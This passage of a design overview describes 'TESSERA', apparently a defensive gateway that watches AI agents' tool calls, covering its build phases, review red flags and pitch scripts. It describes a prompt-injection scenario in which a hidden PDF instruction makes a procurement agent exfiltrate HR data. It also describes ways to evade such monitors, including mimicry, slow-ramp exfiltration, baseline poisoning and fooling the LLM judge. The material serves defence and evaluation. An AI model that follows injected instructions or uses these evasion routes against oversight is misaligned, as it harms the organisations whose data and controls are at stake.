**What:** the contract file format, a linter, the compiler to Cedar, signing/hot-reload, and the **dry-run** ("what would this have blocked last week?"). **Why:** the contract is the spine of the product and the hard floor for everything else. **Could go wrong:** a compile bug that quietly widens permissions — hence thousands of golden decisions. **You'll see:** a contract diff and a dry-run report table.

### P3 — Gateway PEP *(★★★★★ — #2 hardest)*
**What:** the policy enforcement point — the Rust service every tool call flows through. It authenticates, runs the pipeline, holds actions for human approval, signs receipts, and survives its dependencies dying. **Why here:** needs the events and contracts; everything after plugs into it. **Could go wrong:** protocol details of MCP, tail latency, and getting failure behaviour *right* (fail-closed for risky actions, never a bypass). **You'll see:** a split-screen terminal: the agent's call on the left, ALLOW/DENY with a receipt id on the right, plus a latency histogram.

### P4 — Provenance & taint engine *(★★★★★ — the hardest)*
**What:** the ledger of what the agent has read, the entity extraction and matching ("where did this value first appear?"), hidden-text extraction from PDF/HTML/DOCX (in a sandboxed worker, because PDF parsers are risky), and the flow rules (integrity and confidentiality). **Why next:** this is the heart of "valid credentials but hijacked". **Could go wrong:** the soundness/false-positive trade-off — the biggest research risk in the project. **You'll see:** a **provenance graph picture** for the S1 session — source PDF → argument → denied action, coloured by trust. At this point S1 is blocked by **rules alone**, no ML.

### P5 — Testbed & data engine *(★★★★)*
**What:** the fake company (files, ERP, email, HR, a web server and the "evil" collection endpoint), real agents that use it, a trace synthesiser for volume, and the nine-family attack factory, plus labels and tricky data splits. **Why now (and in parallel earlier):** the ML phase needs data and the demo needs a world. **Could go wrong:** unrealistic data → flattering numbers; hence the real-agent "realism exam". **You'll see:** a "Data Atlas" page and — importantly — the **"before" picture: S1 successfully hijacking an unprotected agent**.

### P6 — ML core *(★★★★★ — #3 hardest)*
**What:** the single feature implementation and its parity test, then M1 (Markov), M3 (intent), M4 (content signals), role priors, M2 (TraceFormer), M5 (drift), and the baseline lifecycle (day 0 → established). **Why this order:** cheapest, strongest baselines first; the neural model must *earn* its place. **Could go wrong:** train/serve skew, over-claiming from synthetic data, mimicry beating the learned layers. **You'll see:** plots — the surprisal timeline for an S1 session (benign vs attacked), ROC curves per model, the first cold-start curve.

### P7 — Fusion · calibration · explainability · judge *(★★★★)*
**What:** combine everything into one calibrated, additive risk; build conformal alert budgets; write the decision procedure with its safety invariants; build the boxed-in judge; build evidence packs and the lint; group verdicts into cases with a root cause. **Why:** turns many signals into *one defensible verdict*. **Could go wrong:** miscalibration under shift; the judge being fooled; explanations that don't add up. **You'll see:** the risk **waterfall** picture, a **reliability plot**, and a sample evidence-pack PDF.

### P8 — Response plane *(★★★★)*
**What:** the token service (RFC 8693 exchange, short-lived single-hop tokens, downgrade), the containment ladder with capability narrowing, revocation signals (CAEP), human approvals, the decoy sandbox, and the utility-retention measurement. **Why now:** detection is only half the PS; "restrict or isolate without disrupting" is the other half. **Could go wrong:** narrowing that breaks legit work, or revocation that silently never arrives (so short token lifetimes are the backstop). **You'll see:** a recording of the ladder climbing, and decoded token claims before/after downgrade.

### P9 — Multi-agent chains *(★★★★)*
**What:** record who delegates to whom, shrink each child's authority to (parent ∩ child's own contract), carry taint across handoffs, compute blast radius and name **patient zero**, and contain the downstream agents that accepted tainted messages — leaving unrelated agents alone. **Why after P8:** it reuses provenance labels and the containment engine. **Could go wrong:** taint "dilution" through summaries — handled by keeping taint at session level. **You'll see:** a graph of agents with patient zero badged and the blast radius shaded.

### P10 — Decoys & deception *(★★)*
**What:** place honey files, canary keys and canary URLs from the contract; run the callback service; match canary strings on outbound traffic; and **prove no healthy agent ever touches a decoy**. **Could go wrong:** a decoy on a legitimate listing path ⇒ false alarms. **You'll see:** a decoy-hit lighting up in the live feed.

### P11 — Control API & Console *(★★★, large)*
**What:** the API and the nine screens, built *incrementally from P2* with mock data and finished after P9. The Case Board is the centrepiece. **Why parallel:** it's the biggest volume of work and the thing judges *see*. **Could go wrong:** the UI showing something the engine didn't decide. **You'll see:** every screen as a screenshot in `docs/phase-shots/`.

### P12 — Evaluation & red team *(★★★★)*
**What:** the exam: AT-01…20, baselines, cold start, legit-change, calibration, latency, chaos, AARM self-check, adaptive attackers and the ablation matrix; the report generator. **Why late but prepared early:** it needs everything, but the harness skeleton exists from the beginning. **Could go wrong:** flattering the numbers — hence adaptive attackers and the claim guard. **You'll see:** the `/benchmarks` page with every number tagged and stamped with a commit hash.

### P13 — Hardening · packaging · demo *(★★★)*
**What:** performance pass, a real security review (Trail of Bits skills: insecure-defaults, supply-chain, Semgrep/CodeQL, differential review), Docker/compose/Helm packaging, rendered diagrams, rehearsals. **Could go wrong:** shipping a security product with its own vulnerabilities. **You'll see:** a clean-clone `just demo`, the architecture poster, and the 5-minute recording.

**Difficulty ranking (hardest → easiest):** P4 · P3 · P6 · P7 · P8 · P5 · P9 · P12 · P1 · P2 · P11 · P13 · P10 · P0.

---

## 7. What to watch for as a human reviewer

### 7.1 Red flags in AI-written code for *this* project

1. **Fail-open defaults.** Any new data-plane path that, on error/timeout, lets the action through. Risky tiers (egress, write, exec, delegate) must fail **closed**.
2. **Secrets or raw content in logs/spans.** We store digests and redacted args by default; prompts, tool results and tokens must not appear in logs.
3. **Hand-edited generated code** (anything produced by `contracts/codegen.sh`). Edit the schema, regenerate.
4. **Features computed twice** (a Python re-implementation of a Rust feature). Delete it; use `tessera-cli features`.
5. **Un-tagged numbers** in README/deck/UI. Every figure needs `[MEASURED]` (and must match `benchmark.json`), `[EXT]` (with source) or `[TARGET]`.
6. **A judge that can clear a tainted consequential action**, or any path where a learned score *overrides* a hard floor.
7. **Returning scores or rule names to the agent** in a denial message (lets attackers probe thresholds). Errors must be generic.
8. **Token passthrough** — forwarding the caller's token to an upstream tool. We mint a fresh, audience-bound token.
9. **Baselines updating from unreviewed sessions** (poisoning). Updates only from clean sessions, within the movement budget.
10. **Contract widening without two-person approval**, or a change event widening scope.
11. **Unsigned or unverified artefacts** (policy bundles, models) being hot-loaded.
12. **Pickle / arbitrary deserialisation** of model or data files. ONNX/JSON/Parquet only.
13. **Time-based or step-based data splits that leak** (splitting by step instead of session).
14. **Heavy parsers (PDF) running inside the gateway** instead of the sandboxed worker.
15. **Tests that can't fail** — a sub-phase isn't done unless a test fails when the behaviour is removed.
16. **Over-confident copy** ("prevents all prompt injection", "99% accurate"). Replace with the actual claim and its tag.

### 7.2 Twenty questions to test yourself before a judge does

| # | Question | Short answer |
|---|---|---|
| 1 | Why aren't valid credentials enough? | They prove identity and permission, not that the agent is still acting as its role; injected instructions change behaviour without touching credentials. |
| 2 | What is the Role Contract and why is it a "hard backstop"? | A signed machine-readable job description compiled to Cedar and checked on every step; learned layers can add to risk but can never override it, and no prompt can edit it. |
| 3 | What does provenance add that a classifier doesn't? | It judges the *effect* (untrusted origin steering a privileged action), not the wording, so paraphrasing doesn't evade it. |
| 4 | How does APM work in one breath? | Ledger of everything read, each labelled by trust; for each sensitive argument, find where its value first appeared; untrusted-first-seen + consequential sink ⇒ step-up/deny. |
| 5 | Why is the confidentiality rule at session level? | So the label survives the LLM summarising/rewording the data — it can't launder it. |
| 6 | Why decoys? | Day-0, near-zero-false-positive signal that mimicry can't avoid. |
| 7 | How do you handle zero history? | Day-0 stack (contract + provenance + decoys + content signals + budgets); learned layers run in shadow on role priors and take over by shrinkage; we plot detection vs history. |
| 8 | Legit change vs attack? | Five discriminators + signed change events + conformal false-alarm budget; fleet-wide shifts count as change. |
| 9 | What is a conformal alert budget? | A dial: compare a score to known-benign data to get a p-value; set α to choose how often false alerts may occur; calibrated per session. |
| 10 | What does "risk 80" mean? | Calibrated: ≈ 80% of comparable steps were hijacks in calibration data (checked with ECE/reliability plot). |
| 11 | Why EBM for fusion? | Additive ⇒ exact explanations that sum to the score; accurate enough on tabular data; tiny, exports to Rust lookup tables. |
| 12 | What can the judge do and not do? | One boxed LLM call on ~3–5% of cases; can escalate; can de-escalate only with high confidence + trusted-origin args + no floor. Never has tools. |
| 13 | What is train/serve skew and how do we prevent it? | Features computed differently in training vs live; one Rust implementation + a parity test. |
| 14 | How do you stop a slow-ramp exfiltration? | Hard budgets in the contract, CUSUM, PSI vs a frozen reference, a movement budget so the monitor can't be taught bad is normal. |
| 15 | How do you protect against mimicry? | Contract/provenance are independent of the learned model; decoys; intent measured against the *task*, not just history; we evaluate a mimicry attacker. |
| 16 | How does containment avoid breaking legit work? | Capability narrowing removes only what the drift touched; we measure utility retention (target ≥ 90% `[TARGET]`). |
| 17 | How are chains handled? | Actor-chain tokens, capability attenuation, taint across handoffs, blast radius, patient zero, cascade review. |
| 18 | What's the latency story? | Rust in-process Cedar, tiered ONNX; ALLOW p50 ≈ 7 ms / p99 ≈ 24 ms `[TARGET]`, to be measured by load tests. |
| 19 | What can't it do? | In-contract, trusted-origin malicious action by an authorised principal; weight-level backdoors; guaranteed catch of every adaptive injection — we bound blast radius and measure. |
| 20 | Why should we believe your numbers? | Claim guard: only `[MEASURED]` numbers from the current commit's `just eval` are presented as results; adaptive attackers and leave-one-family-out are in the eval; `[EXT]` figures are attributed. |

---

## 8. Glossary and the 30-second / 2-minute scripts

### 8.1 Short glossary

| Term | Plain meaning |
|---|---|
| **Agent** | An AI program that decides and acts (calls tools) on its own |
| **Credential / token** | Proof of identity (who) — not proof of intent (what it's doing now) |
| **MCP** | Model Context Protocol — the standard way agents call tools |
| **Gateway / PEP** | The checkpoint all tool calls pass through |
| **Cedar** | A fast, safe language for "who may do what" rules |
| **Role Contract** | The signed job description for an agent |
| **Provenance / taint** | Where a value came from; "tainted" = untrusted content influenced it |
| **APM** | Argument Provenance Matching — our way of labelling origins |
| **Behavioural twin** | The learned model of an agent's normal behaviour |
| **Surprisal** | How unlikely an action was given recent actions |
| **Decoy / canary** | A trap no healthy agent touches |
| **EBM** | Explainable Boosting Machine — a model whose parts add up exactly |
| **Conformal** | A way to get a controllable false-alarm rate from known-normal data |
| **CUSUM / ADWIN / PSI** | Detectors for slow ramps / sudden changes / gradual redistribution |
| **Containment ladder** | L0 observe → L5 kill, narrowing before shutting down |
| **STS / CAEP** | Token service / "revoke now" signals between identity systems |
| **AARM / OWASP ASI** | A runtime-security spec / a top-10 list of agent risks we map to |
| **ABR / FPR@1k / TTD** | Attack block rate / false alerts per 1,000 benign steps / time to detect |

### 8.2 The 30-second version

> "Companies give AI agents valid credentials, but today's security only checks the credential, not whether the agent is still doing its job. A hidden instruction in a document can turn a procurement agent into a data thief while every access check passes. TESSERA sits between agents and their tools. It enforces a signed role contract on every step, tracks where each instruction came from, learns each agent's normal behaviour, plants decoys, and when something drifts it explains why with a calibrated risk score — and narrows the agent's powers surgically, so its real work keeps running."

### 8.3 The 2-minute version

> "**The gap.** IAM asks *is this identity allowed?* — never *is the agent still the agent?* In the problem statement's own example, a procurement agent reads a supplier PDF with a hidden instruction and starts reading HR salary files and sending data out, with a perfectly valid token. RSAC 2026 reviews found no vendor shipping an agent behavioural baseline.
>
> **Our approach — four ideas.** First, every agent has a **signed Role Contract**, compiled to Cedar and checked on every step; that's a hard floor no prompt can talk around. Second, a **gateway** sees both directions of every tool call and tracks **provenance** — it knows the recipient came from page 3 of an untrusted PDF, so we judge the *effect*, not the wording. Third, a **behavioural twin** — a Markov model, a small task-conditioned sequence model and intent embeddings, learned from benign traces, shrunk toward role priors so a brand-new agent isn't blind — plus **decoys** that give detection on day zero. Fourth, a **graduated containment ladder**: we remove only what the drift touched, and the agent finishes its legitimate task.
>
> **Why you can trust it.** Everything fuses into an **additive, calibrated risk** — the explanation sums to the score — with a **conformal alert budget** you can dial. Legitimate change is handled with signed change events and five discriminators; slow attacks by hard budgets, CUSUM and a frozen reference; chains by taint and attenuation. We evaluate against **adaptive attackers**, publish the residual, and a claim guard ensures every number we show is reproducible.
>
> **What it isn't.** It won't catch an in-contract malicious action by an authorised person, and we don't claim to stop all injection — we bound blast radius and measure the rest. It aligns with AARM, OWASP's Agentic Top 10, OpenTelemetry GenAI, CAEP and RFC 8693, so it fits what enterprises are standardising on."

*End of overview. For the contracts, data model, and the phase-by-phase build instructions, see `SYSTEM-ARCHITECTURE.md`.*
